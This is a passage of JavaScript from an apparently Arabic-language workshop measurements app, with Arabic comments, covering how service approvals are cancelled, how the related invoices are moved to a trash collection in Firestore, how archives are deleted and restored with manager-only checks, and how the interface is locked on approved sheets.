        const parts = [getTypeName(i.type)];
        if ((i.type === 'seranati' || i.type === SER_NORMAL_ID) && i.sk) parts.push(i.sk);
        if (i.type === 'pvc' && i.itemColor) parts.push(i.itemColor);
        if (i.note) parts.push(i.note);
        return parts.filter(Boolean).join(' - ');
      };
      const lines = items.map(i => {
        const n = noteOf(i);
        return `${i.w} × ${i.h}` + (n ? ' ' + n : '');
      }).join('\n');

      /* الهاتف والموقع والرسم يُرسَل معها: ورقة القص تصل للمنجرة وحدها،
         ومن يقصّ قد يحتاج أن يتصل بالزبون أو يصل إليه أو يرى الشكل
         المطلوب — فبلا هذه يعود للكراسة أو يتصل بمن يعود عنه. */
      const st = (a.data || {});
      const handoffPayload = {
        lines: lines,
        items: items.map(i => ({ w: i.w, h: i.h, note: noteOf(i), img: i.img || '', cuttingFormula: i.cuttingFormula || '', cuttingProfile:i.cuttingProfile||'', formulaSnapshot:i.formulaSnapshot||null,openingLayout:i.openingLayout||null,accessoryExceptions:i.accessoryExceptions||{},executionId:i.executionId||'', formulaLabel: i.formulaLabel || '', openingDirection: i.openingDirection || '', cuttingSymbol:i.cuttingSymbol||'', symbolLabel:i.symbolLabel||'', leafLayout:i.leafLayout||'' })),
        customerName: st.custName || a.name || '',
        customerPhone: st.custPhone || '',
        customerLocation: st.custLocation || null,
        ts: Date.now()
      };
      if (!persistCuttingHandoff(handoffPayload)) return;
      window.location.href = 'cutting.html';
    }

    async function cancelServiceApproval(idx) {
      if (!requireMeasurementsAccess('إلغاء اعتماد الخدمة')) return;
      if (!isManagerUser()) { alert('⛔ إلغاء اعتماد الخدمة متاح للمدير وحده.'); return; }
      const a = archives[idx];
      if (!a || !a.approved) return;

      /* ══ إلغاء الاعتماد يحتاج اتصالاً ══
         القرار هنا مبنيّ على قراءة الفاتورة ودفعاتها ومرتجعاتها. ودون
         اتصال تُقرأ هذه من الذاكرة المحلية وحدها — وهي لا تعرف ما سجّله
         زميل على جهازه بعد. فقد تُقرأ فاتورة «بلا دفعات» وعليها دفعة
         حقيقية، فيُحذف عمل موجود بناءً على معلومة ناقصة.
         بقية الكراسة تعمل دون اتصال كما هي؛ هذا الإجراء وحده يُؤجَّل. */
      if (!navigator.onLine) {
        alert('🔴 إلغاء الاعتماد يحتاج اتصالاً بالإنترنت.\n\n' +
              'القرار يعتمد على قراءة الفاتورة ودفعاتها ومرتجعاتها من السيرفر — ' +
              'ودون اتصال قد تكون ناقصة فيُحذف عمل قائم.\n\nأعد المحاولة بعد عودة الشبكة.');
        return;
      }

      const invId = a.approvedInvId || '';
      if (!invId) {
        if (!confirm('هذه الكراسة موسومة كمعتمدة بلا رقم حساب.\n\nإزالة الوسم فقط؟')) return;
        fsUpdate('measurementJobs', a.id, { approved: false, approvedInvId: '', approvedPaid: 0, approvedTotal: 0 });
        patchArchiveLocal(a.id, { approved: false, approvedInvId: '', approvedPaid: 0, approvedTotal: 0, approvedAt: 0, approvedBy: '' });
        showMiniToast('أُزيل وسم الاعتماد', '#157f4a');
        return;
      }

      let inv = null;
      try {
        const d = await db.collection('sales').doc(invId).get();
        if (d.exists) inv = d.data();
      } catch (e) {
        alert('⚠️ تعذّر قراءة الفاتورة ' + invId + ' — تأكد من الاتصال وأعد المحاولة.');
        return;
      }

      if (!inv) {
        // حُذفت من الفواتير أصلاً: نكتفي بإزالة الوسم لتعود الكراسة قابلة للاعتماد
        if (!confirm('الفاتورة ' + invId + ' لم تعد موجودة في الفواتير.\n\nإزالة وسم الاعتماد لتعود الخدمة قابلة للاعتماد؟')) return;
        fsUpdate('measurementJobs', a.id, { approved: false, approvedInvId: '', approvedPaid: 0, approvedTotal: 0 });
        patchArchiveLocal(a.id, { approved: false, approvedInvId: '', approvedPaid: 0, approvedTotal: 0, approvedAt: 0, approvedBy: '' });
        showMiniToast('أُزيل وسم الاعتماد ✅', '#047480');
        return;
      }

      // هل تحرّكت الفاتورة بعد الاعتماد؟
      const reasons = [];
      if (inv.editedAt) reasons.push('عُدِّلت بعد الاعتماد');
      const origPaid = money2(a.approvedPaid || 0);
      if (money2(inv.cashReceived != null ? inv.cashReceived : inv.paid) !== origPaid) {
        reasons.push('تغيّر المبلغ المدفوع عليها');
      }
      if (money2(inv.subtotal || 0) !== money2(a.approvedTotal || 0)) reasons.push('تغيّر إجماليها');
      try {
        const others = await db.collection('payments').where('customerName', '==', inv.customerName).get();
        let extra = 0;
        others.forEach(d => {
          const p = d.data();
          if (d.id === 'PAYINV-' + invId) return;
          if (Array.isArray(p.debtDistribution) && p.debtDistribution.some(x => x.saleId === invId)) extra++;
        });
        if (extra) reasons.push('سُدِّد عليها ' + extra + ' واصل سداد');
        const rets = await db.collection('returns').where('originalInvId', '==', invId).get();
        if (!rets.empty) reasons.push('سُجِّل عليها ' + rets.size + ' إرجاع');
      } catch (e) { /* تعذّرت القراءة: نكمل بما تحقّقنا منه */ }

      if (reasons.length) {
        alert('⛔ لا يمكن إلغاء الاعتماد من هنا.\n\n' +
              'الفاتورة ' + invId + ':\n   • ' + reasons.join('\n   • ') + '\n\n' +
              'حذفها هنا يمحو عملاً لاحقاً لا علاقة له بالكراسة.\n' +
              'افتح تطبيق الفواتير واحذفها من هناك — فيه أدوات العكس الكاملة — ثم أعد المحاولة.');
        return;
      }

      const paidBack = money2(a.approvedPaid || 0);
      const overpay  = money2(Math.max(0, paidBack - money2(inv.subtotal || 0)));
      if (!confirm('إلغاء اعتماد خدمة «' + (a.name || '') + '»؟\n\n' +
                   'ستُنقل الفاتورة ' + invId + ' إلى سلة محذوفات الفواتير' +
                   (paidBack > 0 ? (' مع سجل مقبوضاتها البالغ ' + paidBack.toFixed(2) + ' د.ل') : '') +
                   (overpay > 0 ? ('\nوسيُسحب ' + overpay.toFixed(2) + ' من رصيد العميل') : '') +
                   '.\n\nيمكن استرجاعها من هناك، وتعود الكراسة قابلة للاعتماد من جديد.')) return;

      try {
        /* ══ الفاتورة تُنقل لسلة المهملات لا تُمحى ══
           إلغاء الاعتماد قد يقع بالخطأ، والفاتورة سجل مالي: محوها نهائياً
           يعني ضياع رقمها وبنودها وتاريخها بلا رجعة.

           الصيغة هنا **مطابقة حرفياً** لما يكتبه تطبيق الفواتير عند حذف
           فاتورة (type / id / deletedAt / payload / linkedPayments) — وهذا
           شرط أن يعمل زر «استرجاع» هناك على هذه الفاتورة. أي اختلاف في
           اسم حقل يجعلها تظهر في السلة ولا تُسترجَع. */
        const cancelledPayment = (paidBack > 0) ? {
          id: 'PAYINV-' + invId, invId,
          customerName: inv.customerName, amount: paidBack, type: inv.paymentType || 'كاش',
          reason: 'دفعة عن الفاتورة ' + invId,
          date: inv.date || '', timestamp: inv.timestamp || Date.now(),
          signedBy: inv.signedBy || '', signedByUid: inv.signedByUid || '',
          debtDistribution: [{ saleId: invId, amountApplied: money2(inv.paid || 0) }],
          creditAdded: overpay
        } : null;

        fsSet('trash', invId, {
          type: 'فاتورة مبيعات',
          id: invId,
          deletedAt: Date.now(),
          dateStr: new Date().toLocaleString('ar-EG'),
          payload: inv,
          linkedPayments: cancelledPayment ? [cancelledPayment] : [],
          deletedBy: (window.currentShopUser && window.currentShopUser.name) || '',
          deletedReason: 'إلغاء اعتماد خدمة من كراسة القياسات'
        });

        if (overpay > 0) {
          fsMergeIncrement('creditBalances', encodeURIComponent(inv.customerName), 'amount', -overpay, { name: inv.customerName });
        }
        if (paidBack > 0) fsDelete('payments', 'PAYINV-' + invId);
        fsDelete('sales', invId);
        const cancelledAt = Date.now();
        const cancelledBy = (window.currentShopUser && window.currentShopUser.name) || '';
        const cancelPatch = {
          approved: false, approvedInvId: '', approvedPaid: 0, approvedTotal: 0, approvedAt: 0, approvedBy: '',
          workStarted: false, workStartedAt: 0, workStartedBy: [],
          workDone: false, workDoneAt: 0, workDoneBy: '',
          cancelledAt: cancelledAt, cancelledBy: cancelledBy
        };
        fsUpdate('measurementJobs', a.id, cancelPatch);
        patchArchiveLocal(a.id, cancelPatch);
      } catch (e) {
        alert('⚠️ تعذّر إلغاء الاعتماد: ' + (e && e.message ? e.message : e));
        return;
      }

      /* رفع القفل عن الكراسة المفتوحة الآن.
         نطابق برقم الفاتورة أيضاً لا بمعرّف المستند وحده: بعد الاعتماد
         تُؤرشَف الكراسة وتُفرَّغ الشاشة، فقد يتغيّر currentArchiveDocId
         ويبقى القفل معلّقاً بلا ما يرفعه. */
      const openMatches = (currentArchiveDocId === a.id) ||
                          (sheetApproval && sheetApproval.invId === invId);
      if (openMatches) {
        setSheetApproval(null);
        try { saveCurrentState(); } catch (e) {}   // تُحفظ الحالة الجديدة محلياً فوراً

        /* الكراسة المفتوحة من الأرشيف تكون في وضع العرض، فبنودها المالية
           مقفولة. ومن ألغى الاعتماد إنما ألغاه ليصحّح شيئاً — فتركه أمام
           جدول لا يُكتب فيه بلا تفسير هو نصف إصلاح. نعرض عليه الفتح بدل
           أن نفتحه من تلقائنا، فالفتح التلقائي يُعرّض كراسة محفوظة للتعديل
           بالخطأ. */
        if (isSheetLocked()) {
          if (confirm('أُلغي الاعتماد ✅\n\nالكراسة معروضة للقراءة فقط.\nهل تريد فتحها للتعديل الآن؟')) {
            setSheetViewOnly(false);
          }
        }
      }
      showMiniToast('أُلغي الاعتماد — الفاتورة في سلة المحذوفات ✅', '#047480');
    }

    function loadArchiveByIndex(idx) {
      if(archives[idx]) {
        const a = archives[idx];

        /* ══ سبب تكرار الزبون عند فتح كراسته ══
           كان setCurrentArchiveDoc يقع **بعد** loadFromJSON. و loadFromJSON
           يملأ الحقول ويستدعي saveCurrentState في أثناء ذلك — وفي تلك
           اللحظة يكون currentArchiveDocId فارغاً، فيرى الشرط
           `!currentArchiveDocId && hasMeaningfulData` صحيحاً فيُنشئ
           **مستنداً جديداً بمحتوى الكراسة المفتوحة** — نسخة كاملة من
           كراسة موجودة أصلاً.

           فكل فتح لكراسة زبون سابق كان يُنتج نسخة ثانية منها.

           الآن: يُربط المستند **أولاً**، وقفلٌ يمنع أي إنشاء أثناء
           التحميل — فحتى لو استُدعيت saveCurrentState من مسار لم نتوقّعه
           لا تُنشئ شيئاً. */
        _loadingArchive = true;
        setCurrentArchiveDoc(a.id);
        currentArchiveIndex = idx;
        let _archiveLoaded = false;
        try {
          loadFromJSON(a.data);
          _archiveLoaded = true;
        } catch (e) {
          console.error('load archive:', a.id, e);
          /* v248: لا نترك النقر على اسم الزبون بلا نتيجة إذا كانت لقطة
             الكراسة القديمة تحتوي حقلاً غير متوقع. نحمّل الحد الأدنى
             الآمن ثم نُبقي الكراسة مفتوحة للقراءة بدلاً من كسر الصفحة. */
          try {
            const d = a.data || {};
            document.getElementById('custName').value = d.custName || a.name || '';
            document.getElementById('custPhone').value = d.custPhone || '';
            custLocation = d.custLocation || null;
            custPhotos = Array.isArray(d.custPhotos) ? d.custPhotos : [];
            jobList = Array.isArray(d.jobList) ? d.jobList : [];
            document.getElementById('billArea').innerHTML = '';
            renderTable(); updateShareHeader(); renderLocationButton();
            _archiveLoaded = true;
            showMiniToast('⚠️ فُتحت الكراسة بوضع الاسترداد الآمن؛ يوجد حقل قديم غير متوافق.', '#b45309');
          } catch (e2) {
            console.error('safe archive fallback:', e2);
            showMiniToast('⚠️ تعذّر فتح هذه الكراسة. لم تُحذف أي بيانات.', '#b42318');
          }
        } finally {
          _loadingArchive = false;
        }
        if (!_archiveLoaded) return;
        /* وسم الاعتماد مصدره Firestore وحده — يضع القفل **ويزيله**.
           كان الشرط `if (a.approved)` يضع القفل ولا يرفعه أبداً. وبما أن
           loadFromJSON قبله يستعيد sheetApproval من **لقطة الكراسة**
           المحفوظة — وهي لقطة قديمة أُخذت وقت الأرشفة وما زالت تحمل
           الاعتماد — كانت الكراسة تعود مقفولة بعد إلغاء الاعتماد:
           خانة الدفع معطّلة والزر يقول «الخدمة معتمدة بالفعل» رغم أن
           الاعتماد أُلغي فعلاً وحُذفت فاتورته.
           الآن: القيمة تُؤخذ من الوسم الحيّ دائماً، وضعاً ورفعاً. */
        setSheetApproval(a.approved
          ? { invId: a.approvedInvId || '', paid: a.approvedPaid || 0, at: a.approvedAt || 0 }
          : null);
        editingIndex = -1;
        editOpenedAt = 0;
        updateMainActionLabel();
        document.getElementById('editHint').style.display = 'none';
        setSheetViewOnly(true);   // كراسة محفوظة → عرض فقط حتى يُطلب التعديل صراحةً
        saveCurrentState();
        loadArchiveUI();
        // v287: إغلاق قائمة الأرشيف والزبائن بعد فتح كراسة محفوظة.
        // يجب تنفيذ الإغلاق بعد loadArchiveUI حتى لا تبقى القائمة مفتوحة
        // إذا أعاد تحديث الأرشيف بناء عناصر الصفحة.
        closeArchiveCustomersPanel();

        /* ══ الفتح على الجدول مباشرةً ══
           كان يصعد لأعلى الصفحة — وهناك بطاقة بيانات الزبون (المخفية الآن
           في وضع العرض) وخانات الإدخال المعطّلة. فيرى المستخدم شاشة شبه
           فارغة ويمرّر بنفسه بحثاً عن المقاسات التي فتح الكراسة لأجلها.

           الآن يقف عند رأس الجدول: اسم الزبون وهاتفه وموقعه في صدره،
           والمقاسات تحته مباشرةً. التمرير مؤجَّل بإطار واحد لأن renderTable
           تعيد بناء الصفوف، وقياس الموضع قبل اكتمالها يعطي رقماً خاطئاً. */
        requestAnimationFrame(() => {
          const target = document.getElementById('shareHeader');
          const visible = target && target.style.display !== 'none';
          if (visible) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
          else {
            const tbl = document.querySelector('.table-wrap');
            if (tbl) tbl.scrollIntoView({ behavior: 'smooth', block: 'start' });
            else window.scrollTo({ top: 0, behavior: 'smooth' });
          }
        });
      }
    }

    /* ============================================================
       سلة المهملات — لا حذف نهائي إلا بيد المدير
       ------------------------------------------------------------
       الحذف من الأرشيف لا يمحو شيئاً: يضع علامة deleted على المستند
       فينتقل إلى السلة، ولا يُمسح منها شيء تلقائياً مهما طال الوقت.
       ============================================================ */
    /* أُلغيت مهلة الـ90 يوماً: الحذف النهائي متاح للمدير في أي وقت.
       الضمانة الباقية أن الحذف من الأرشيف ينقل للسلة ولا يمحو، وأن المحو
       النهائي لا يقع إلا بيد المدير وبتأكيدين متتاليين — فلا شيء يُفقد
       بضغطة عابرة، ولا انتظار مفروض على من يريد تنظيف السلة اليوم. */

    /* isManagerUser مُعرَّفة أعلاه مرة واحدة. كان لها تعريف ثانٍ هنا
       مطابق له — والثاني يغطّي الأول برفع الدوال (hoisting). لا فرق
       اليوم لتطابقهما، لكن تعديل أحدهما مستقبلاً كان سيجعل السلوك
       يختلف بين موضع وآخر بلا أن يظهر سبب. */

    const _archiveDeleteInFlight = new Set();
    async function deleteArchive(idx) {
      if (!requireMeasurementsAccess('حذف الكراسة')) return;
      if (!archives[idx]) return;
      if (!isManagerUser()) { alert('⛔ حذف عملية من الأرشيف متاح للمدير فقط.'); return; }
      const a = archives[idx];
      if (a.approved) {
        alert('⛔ لا يمكن حذف خدمة معتمدة.\n\n' +
              'لها فاتورة قائمة في الفواتير' + (a.approvedInvId ? (' برقم ' + a.approvedInvId) : '') + '.\n\n' +
              'اضغط «إلغاء الاعتماد» أولاً — يحذف الفاتورة ويعكس مقبوضاتها — ثم احذف الكراسة.');
        return;
      }
      const id = String(a.id || '');
      if (!id || _archiveDeleteInFlight.has(id)) return;
      if (!confirm('نقل «' + a.name + '» إلى سلة المهملات؟\n\nلن تُفقد الكراسة — تبقى في السلة ويمكن استرجاعها في أي وقت.')) return;
      _archiveDeleteInFlight.add(id);
      try {
        // لا نعلن نجاح الحذف محلياً قبل تأكيد الخادم؛ هذا يمنع بقاء نسخة قديمة
        // في المتصفح ويمنع اعتبار فشل الشبكة حذفاً ناجحاً.
        if (!navigator.onLine) throw new Error('لا يوجد اتصال بالإنترنت. لم تُحذف الكراسة؛ أعد المحاولة عند عودة الاتصال.');
        const deletedAt = Date.now();
        const deletedBy = (window.currentShopUser && window.currentShopUser.name) || '';
        const ref = db.collection('measurementJobs').doc(id);
        const snap = await ref.get({ source: 'server' });
        if (snap && snap.exists) {
          await ref.update({ deleted: true, deletedAt, deletedBy });
        } else {
          // المستند غير موجود على الخادم أصلاً: أزل النسخة المحلية القديمة فقط.
          console.warn('[archive-delete] stale local archive entry:', id);
        }
        if (id === currentArchiveDocId) { currentArchiveIndex = -1; rotateArchiveCreationOperationId(); setCurrentArchiveDoc(null); }
        else if (idx < currentArchiveIndex) currentArchiveIndex--;
        const patch = { deleted: true, deletedAt, deletedBy };
        patchArchiveLocal(id, patch);
        // أزل أي نسخة متبقية من القوائم المحلية، ثم حدّث التخزين المؤقت إن وجد.
        archives = (archives || []).filter(x => x && String(x.id) !== id);
        archivesTrash = (archivesTrash || []).filter(x => x && String(x.id) !== id);
        const trashed = Object.assign({}, a, patch);
        archivesTrash.unshift(trashed);
        try {
          // ws_archives هو المفتاح المعتمد للتهيئة المحلية؛ خزّن النشط فقط
          // حتى لا يعود السجل المحذوف عند إعادة فتح الصفحة أو عند ترحيل قديم.
          const activeCache = (archives || []).filter(x => x && x.deleted !== true).map(x => ({
            id: x.id, name: x.name || '', data: x.data || {}, updatedAt: x.updatedAt || 0,
            createdAt: x.createdAt || x.updatedAt || 0, deleted: false,
            approved: !!x.approved, approvedInvId: x.approvedInvId || '',
            workStarted: !!x.workStarted, workDone: !!x.workDone
          }));
          safeSetItem('ws_archives', JSON.stringify(activeCache));
          safeRemoveItem('ws_measurement_archives');
          safeSetItem('archives_migrated_to_cloud', '1');
        } catch (cacheErr) { console.warn('[archive-delete] local cache update failed:', cacheErr); }
        const box = document.getElementById('archiveSearch');
        loadArchiveUI(box ? box.value : '', true);
        renderTrashUI();
        showMiniToast('🗑️ تم تحديث الحذف في هذا المتصفح والخادم', '#157f4a');
      } catch (err) {
        console.error('[archive-delete] failed:', err);
        showFsErrorToast(fsErrorMessage(err, 'حذف كراسة القياسات'));
        alert('⚠️ لم يتم تأكيد الحذف من الخادم، لذلك لم أعتبره ناجحاً.\n\n' + (err && err.message ? err.message : 'تحقق من الاتصال والصلاحيات ثم أعد المحاولة.'));
      } finally {
        _archiveDeleteInFlight.delete(id);
      }
    }

    /* ══ تبديل شكل صف الإضافة ══
       رأسي (افتراضي): زر الإضافة كبير على اليمين والأنواع عمود بجانبه.
       أفقي: الأنواع صفٌّ أعلى وزر الإضافة عريض تحته.
       الاختيار يُحفظ محلياً فيبقى بين الجلسات — تفضيل شخصي لا حالة عمل،
       فلا يُحفظ مع الكراسة ولا يُزامَن. */

    function toggleTrashPanel() {
      const panel = document.getElementById('trashPanel');
      const chev  = document.getElementById('trashChevron');
      if(!panel) return;
      const open = panel.style.display === 'none';
      panel.style.display = open ? 'block' : 'none';
      if(chev) chev.className = 'fas fa-chevron-' + (open ? 'up' : 'down');
    }


    function renderTrashUI() {
      const sec  = document.getElementById('trashSection');
      const list = document.getElementById('trashList');
      const cnt  = document.getElementById('trashCount');
      if(!sec || !list) return;
      // السلة تظهر للمدير فقط، ولا تظهر إطلاقاً وهي فارغة
      if(!archivesTrash.length || !isManagerUser()) { sec.style.display = 'none'; return; }
      sec.style.display = '';
      if(cnt) cnt.textContent = archivesTrash.length;

      list.innerHTML = archivesTrash.map(t => {
        const when = t.deletedAt ? new Date(t.deletedAt).toLocaleDateString('ar-EG') : '—';
        const who  = t.deletedBy ? (' — بواسطة ' + escHtml(t.deletedBy)) : '';
        return `
        <div class="trash-item">
          <div class="t-name">${escHtml(t.name)}</div>
          <div class="t-meta">حُذفت في ${escHtml(when)}${who}</div>
          <div class="t-actions">
            <button class="t-btn t-restore" onclick="restoreFromTrash('${escAttr(t.id)}')">
              <i class="fas fa-rotate-left"></i> استرجاع
            </button>
            <button class="t-btn t-purge" onclick="purgeFromTrash('${escAttr(t.id)}')"
                    title="حذف نهائي لا رجعة فيه">
              <i class="fas fa-xmark"></i> حذف نهائي
            </button>
          </div>
        </div>`;
      }).join('');
    }

    function restoreFromTrash(id) {
      if (!requireMeasurementsAccess('استعادة الكراسة')) return;
      const t = archivesTrash.find(x => x.id === id);
      if(!t) return;
      if(!isManagerUser()) { alert('⛔ متاح للمدير فقط.'); return; }
      if(!confirm('استرجاع «' + t.name + '» إلى الأرشيف؟')) return;
      const restorePatch = { deleted: false, deletedAt: 0, deletedBy: '' };
      fsUpdate('measurementJobs', id, restorePatch);
      patchArchiveLocal(id, restorePatch);
      showMiniToast('↩️ عادت إلى الأرشيف ✅', '#047480');
    }

    function purgeFromTrash(id) {
      if (!requireMeasurementsAccess('الحذف النهائي')) return;
      const t = archivesTrash.find(x => x.id === id);
      if(!t) return;
      if(!isManagerUser()) { alert('⛔ متاح للمدير فقط.'); return; }
      if(!confirm('⚠️ حذف «' + t.name + '» نهائياً؟\n\nلا رجعة في هذا الحذف — تُمحى الكراسة ومقاساتها ورسوماتها وصورها بالكامل.')) return;
      if(!confirm('تأكيد أخير: امحُ «' + t.name + '» نهائياً؟')) return;
      fsDelete('measurementJobs', id);
      removeArchiveLocal(id);
      showMiniToast('تم الحذف النهائي', '#b12c1b');
    }

    // نسخ قائمة المقاسات للحافظة: المقاس فقط في كل سطر، بدون ترقيم أو عنوان أو أي نص إضافي
    function copyCutList(type) {
      let items = jobList.filter(i => i.type === type);
      if(items.length === 0) { alert('لا توجد مقاسات من هذا النوع'); return; }
      let text = items.map(i => `${i.w} × ${i.h}`).join('\n');
      navigator.clipboard.writeText(text).then(() => {
        alert('تم نسخ المقاسات إلى الحافظة ✅');
      }).catch(() => {
        alert('تعذر النسخ التلقائي، إليك القائمة:\n\n' + text);
      });
    }

    // ===== الربط مع تطبيق الفواتير: يأخذ البنود المالية ورقم الهاتف فقط (بدون جدول القياسات نفسه) =====
    // بنود الفاتورة كما هي في جدول البنود المالية
    function collectBillItems() {
      const items = [];
      document.querySelectorAll('.bill-row').forEach(row => {
        const n = row.querySelector('.b-n').value.trim();
        // نفس التقريب المستخدم في الفاتورة، فلا يختلف رقم عن رقم
        const q = money2(row.querySelector('.b-q').value);
        const p = money2(row.querySelector('.b-p').value);
        if(n && (q !== 0 || p !== 0)) items.push({ name: n, qty: q, price: p });
      });
      return items;
    }

    /* قفل خانة الدفع وزر الاعتماد بعد اعتماد الخدمة.
       الخانة تصير للقراءة فقط ويظهر مكانها ما دُفع فعلاً، فلا يُعدَّل رقم
       صار مسجَّلاً في الفواتير — وتعديله هنا لا يغيّر شيئاً هناك، فيظن
       المستخدم أنه صحّح والحقيقة أن الفاتورة بقيت كما هي. */
    /* ══ قفل اسم الزبون ورقمه ══
       يقفلهما سببان مستقلان، ولكلٍّ منهما دالته:
         • وضع العرض  — كراسة محفوظة تُطالَع، لا تُعدَّل بلمسة عابرة.
         • الاعتماد   — الفاتورة صدرت بهذا الاسم والرقم، وتعديلهما هنا لا
           يغيّر شيئاً هناك؛ فيصير في الكراسة اسم وفي الفاتورة اسم آخر،
           ولا يُعرف أيّهما الصحيح عند المطالبة بالدين أو الاتصال بالزبون.

       ولذلك دالة واحدة تحسم الأمرين معاً. كانت كل دالة تكتب readOnly
       بقيمتها هي، فتُلغي ما كتبته الأخرى: كراسة معتمدة غير مقفولة للعرض
       تُفتح خانتاها لمجرد أن applySheetLockUI جرت بعدها. */
    /* ══ الضغط على اسم الزبون أو هاتفه في كراسة مقفولة ══
       يبدأ **كراسة جديدة** ولا يفتح القديمة للتعديل.

       سببه أن القصد من اللمسة يكاد يكون دائماً «زبون جديد»: الشاشة تعرض
       كراسة محفوظة أو معتمدة، فيمدّ المستخدم يده إلى خانة الاسم ليكتب
       اسماً آخر. وفتح القديمة للتعديل عندها يعني أن يكتب اسم الزبون
       الجديد **فوق** اسم القديم — فتُنسب مقاسات زبون إلى آخر، وتنفصل
       الكراسة عن فاتورتها إن كانت معتمدة.

       تغيير اسم كراسة محفوظة يبقى ممكناً، لكن بالطريق الصريح وحده:
       زر «تعديل وإضافة مقاسات» أسفل الجدول. */
    function onLockedIdentityTap() {
      if (!isSheetLocked() && !sheetApproval) return;   // كراسة مفتوحة: اكتب مباشرةً

      const who = (document.getElementById('custName').value || '').trim();
      const msg = sheetApproval
        ? ('هذه خدمة معتمدة' + (who ? (' باسم «' + who + '»') : '') + '.\n\n' +
           'هل تريد بدء كراسة جديدة لزبون آخر؟\n' +
           '(لتعديل بياناتها هي: اضغط «تعديل وإضافة مقاسات» أسفل الجدول)')
        : ('هذه كراسة محفوظة' + (who ? (' باسم «' + who + '»') : '') + '.\n\n' +
           'هل تريد بدء كراسة جديدة لزبون آخر؟\n' +
           '(لتعديلها هي: اضغط «تعديل وإضافة مقاسات» أسفل الجدول)');

      if (!confirm(msg)) { document.getElementById('custName').blur(); return; }

      /* احتياط: الكراسة المقفولة محفوظة في الأرشيف بحكم كونها مقفولة —
         لا يُقفَل إلا ما جاء من الأرشيف أو ما اعتُمد. لكن إن وُجدت لسبب ما
         كراسة مقفولة بلا ارتباط بمستند، نؤرشفها قبل التفريغ. لا نمحو
         شيئاً بناءً على افتراض. */
      try {
        if (!currentArchiveDocId && hasMeaningfulData(buildStateSnapshot())) {
          saveMeasurementsSheet('keep');
        }
      } catch (e) { console.error('حفظ احتياطي قبل الكراسة الجديدة:', e); }

      resetSheetForNextJob('كراسة جديدة — اكتب اسم الزبون');
      setTimeout(() => { try { document.getElementById('custName').focus(); } catch (e) {} }, 120);
    }

    function applyIdentityFieldsLock() {
      const locked = (sheetViewOnly === true) || !!sheetApproval;
      const why = sheetApproval
        ? 'الخدمة معتمدة — عدّل البيانات من تطبيق الفواتير'
        : 'كراسة محفوظة — اضغط «تعديل وإضافة مقاسات» للتعديل';
      ['custName', 'custPhone'].forEach(id => {
        const el = document.getElementById(id);
        if (!el) return;
        el.readOnly = locked;
        el.style.opacity = locked ? '.6' : '';
        el.style.cursor  = locked ? 'not-allowed' : '';
        el.title = locked ? why : '';
      });
    }

    function applyApprovalLockUI() {
      const box   = document.querySelector('.paid-box');
      const input = document.getElementById('sheetPaid');
      const hint  = document.getElementById('sheetPaidHint');
      const btn   = document.querySelector('.handoff-btn.to-invoice');
      const done  = !!sheetApproval;

      if (input) {
        input.readOnly = done;
        input.style.opacity = done ? '.6' : '';
        input.style.cursor  = done ? 'not-allowed' : '';
        if (done) input.value = Number(sheetApproval.paid || 0).toFixed(2);
      }

      applyIdentityFieldsLock();
      if (box) box.style.borderColor = done ? '#0591a1' : '';
      if (hint && done) {
        const p = Number(sheetApproval.paid || 0);
        hint.innerHTML = '<span style="color:#0591a1;">✅ تم الاعتماد — ' +
          (p > 0 ? ('مدفوع عربون ' + p.toFixed(2) + ' د.ل') : 'بلا عربون') +
          '</span><br><span style="color:var(--muted);font-weight:600;">حساب الخدمة: ' +
          escHtml(sheetApproval.invId || '') + '</span>';
      }
      if (btn) {
        btn.classList.toggle('is-approved', done);   // أحمر → أخضر
        btn.disabled = done;
        btn.style.opacity = done ? '.85' : '';       // يبقى واضحاً لا باهتاً، فاللون رسالة
        btn.style.cursor  = done ? 'not-allowed' : '';
        btn.innerHTML = done
          ? '<i class="fas fa-circle-check"></i> الخدمة معتمدة بالفعل'
          : '<i class="fas fa-circle-check"></i> اعتماد الخدمة والبدء فيها';
      }
    }

    function setSheetApproval(v) { sheetApproval = v || null; applyApprovalLockUI(); }

    function readSheetPaid() {
      const el = document.getElementById('sheetPaid');
      const v = money2(el ? el.value : 0);
      return (isNaN(v) || v < 0) ? 0 : v;
    }

    // بيان حيّ أسفل خانة المدفوع: كم بقي ديناً أو كم فاض رصيداً
    function onSheetPaidInput() {
      const hint = document.getElementById('sheetPaidHint');
      if (!hint) return;
      // المجموع المعروض هو المعدَّل إن عُدِّل، وإلا المحسوب — وهو الأساس الصحيح
      const total = (sheetTotalOverride !== null) ? sheetTotalOverride : computedBillTotal();
      const paid  = readSheetPaid();
      if (!paid) { hint.textContent = total ? ('كامل المبلغ ' + total.toFixed(2) + ' سيُسجَّل ديناً على العميل') : ''; hint.style.color = 'var(--muted)'; return; }
      const diff = money2(total - paid);
      if (diff > 0)      { hint.textContent = 'يتبقّى ديناً: ' + diff.toFixed(2) + ' د.ل';        hint.style.color = '#157f4a'; }
      else if (diff < 0) { hint.textContent = 'زائد يُضاف رصيداً للعميل: ' + (-diff).toFixed(2);  hint.style.color = '#0591a1'; }
      else               { hint.textContent = 'مسدَّدة بالكامل ✅';                                hint.style.color = '#0591a1'; }
      try { saveCurrentState(); } catch(e) {}
    }

    /* ============================================================
       اعتماد الفاتورة وحفظها مباشرةً في تطبيق الفواتير
       ------------------------------------------------------------
       تُكتب الفاتورة في Firestore من هنا بلا فتح تطبيق الفواتير إطلاقاً،
       وتُعامَل هناك كأي فاتورة عادية: تُعرض وتُعدَّل وتُسدَّد ويُطالَب بدينها.

       الحقول أدناه مطابقة حرفياً لما يكتبه تطبيق الفواتير عند حفظ فاتورة
       جديدة — أي اختلاف فيها يعني فاتورة «غريبة» تكسر ترابط الحسابات:
         • paid   = ما خُصم على الفاتورة (بحدّ إجماليها)
         • cashReceived = ما سلّمه العميل فعلاً
         • الفائض  = رصيد دائن، لا يُخزَّن على الفاتورة
         • signedByUid إلزامي، وإلا رفضت قواعد Firestore الفاتورة
       ============================================================ */
    /* ══ تنبيه الاسم المكرر ══
       يقع حين يبدأ المستخدم كراسة باسم زبون له كراسة قائمة بالفعل.

       لا نُدمج ولا نكتب فوق شيء — قد يكون شغلاً جديداً لنفس الزبون، وهو
       أمر عادي. لكن المستخدم غالباً لا يعلم أن له كراسة سابقة، فيبني
       عليها ظنّاً أنها جديدة أو العكس. والنتيجة تظهر لاحقاً في الفواتير:
       اسمان متطابقان لحسابين مختلفين، فلا يُعرف أيّهما المقصود عند
       المطالبة بالدين.

       فنُخبره ونترك القرار له: يفتح القائمة، أو يمضي بكراسة منفصلة —
       ولا نمسّ القديمة في الحالتين. */
